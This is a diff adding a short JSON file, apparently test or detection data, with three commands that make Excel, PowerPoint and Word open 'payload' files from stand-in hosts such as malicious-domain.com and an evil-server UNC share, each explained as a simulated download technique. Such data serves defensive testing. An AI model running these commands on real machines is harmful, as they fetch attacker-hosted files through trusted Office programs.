@@ -1,0 +1,14 @@
+[
+  {
+    "output": "EXCEL.EXE \"http://malicious-domain.com/payload.csv\"",
+    "explanation": "This command simulates a potential arbitrary file download using Excel by specifying a URL in the command line. The quotes are inserted for safe parsing, and the URL is modified for testing purposes."
+  },
+  {
+    "output": "POWERPNT.EXE \"https://malicious-domain.com/share/payload.pptx\"",
+    "explanation": "This command simulates a potential arbitrary file download using PowerPoint by specifying a URL in the command line. The quotes are inserted for safe parsing, and the URL is modified for testing purposes."
+  },
+  {
+    "output": "WINWORD.EXE \\\\evil-server.local\\share\\payload.docx",
+    "explanation": "This command simulates a potential arbitrary file download using Word by specifying a UNC path in the command line. The path is modified for testing purposes."
+  }
+]
